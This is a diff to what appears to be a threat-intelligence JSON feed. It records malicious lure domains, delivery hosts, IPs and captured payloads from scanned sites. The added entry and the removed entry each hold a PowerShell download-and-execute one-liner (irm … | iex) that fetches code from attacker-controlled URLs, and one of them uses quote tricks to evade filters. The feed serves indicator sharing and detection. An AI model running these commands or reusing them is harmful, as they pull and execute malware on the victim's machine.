@@ -1,5 +1,30 @@
 [
   {
+    "UrlDomain": "rustonrealtors.com",
+    "DeliveryUrl": [
+      "apidevst.com",
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/ben/a95e4549bad4d866"
+    ],
+    "IP": [
+      "67.222.38.91"
+    ],
+    "Related": [
+      {
+        "Value": "https://apidevst.com/uawfhczhoirqgm3sqa8r2hsloaaytlgjqevq-gkczvof",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/ben/a95e4549bad4d866')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/ben/a95e4549bad4d866"
+    ],
+    "ReportId": "cmwro4vsm2qpw0omlz9qmz51u",
+    "ScannedAt": "2026-11-22T10:02:50.046000+00:00"
+  },
+  {
     "UrlDomain": "wanderlustfestival.art",
     "DeliveryUrl": [
       "img-codes-cloude.info"
@@ -12729,22 +12754,5 @@
     ],
     "ReportId": "cmwgfhtxn0l8j0omldvxcqc8p",
     "ScannedAt": "2026-11-14T13:15:29.637000+00:00"
-  },
-  {
-    "UrlDomain": "ustkanrdk.ru",
-    "DeliveryUrl": [
-      "fastly.jsdelivr.net"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "91.236.136.63"
-    ],
-    "Related": [],
-    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "ResolvedDownloadUrl": [
-      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
-    ],
-    "ReportId": "cmwg9lbgo0l4u0omlslp8xa75",
-    "ScannedAt": "2026-11-14T10:30:14.635000+00:00"
   }
 ]
